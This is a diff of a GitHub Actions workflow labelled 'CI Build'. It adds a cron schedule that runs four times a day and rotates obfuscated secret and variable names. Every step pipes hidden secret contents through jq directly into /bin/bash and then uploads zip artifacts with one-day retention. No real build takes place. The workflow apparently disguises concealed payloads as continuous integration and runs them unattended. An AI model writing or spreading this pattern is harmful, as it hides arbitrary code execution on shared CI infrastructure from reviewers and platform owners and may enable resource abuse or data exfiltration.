@@ -2,6 +2,8 @@ name: CI Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '15 0,6,12,18 * * *'
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
@@ -13,22 +15,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Setup and run
         env:
-          kjzrg4: ${{ secrets.kjzrg4 }}
+          d061: ${{ secrets.d061 }}
         run: |
-          printf '%s' "$kjzrg4" | jq -r .w7387 | /bin/bash
-          printf '%s' "$y8" | jq -r .xgtb8478 | /bin/bash
-          printf '%s' "$jregr4" | jq -r .qx066 | /bin/bash
-          printf '%s' "$hdr3118" | jq -r .s27 | /bin/bash
-          echo $qpy51281 | jq -r .pqba138 | /bin/bash
-          printf '%s' "$pjmu8923" | jq -r .ricof1 | /bin/bash
-          printf '%s' "$gvf992" | jq -r .dt9803 | /bin/bash
-          echo $wuf12891 | jq -r .vumqx992 | /bin/bash
-          printf '%s' "$r65110" | jq -r .izcgx9056 | /bin/bash
+          printf '%s' "$d061" | jq -r .bf31306 | /bin/bash
+          echo $r0943 | jq -r .fyg36 | /bin/bash
+          printf '%s' "$hg3108" | jq -r .zmtr19 | /bin/bash
+          echo $a00 | jq -r .ana62157 | /bin/bash
+          printf '%s' "$q90" | jq -r .tgw82 | /bin/bash
 
       - name: Upload data
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 1FgGdb6q
+          name: SlsiJhFl
           path: "*.zip"
           retention-days: 1
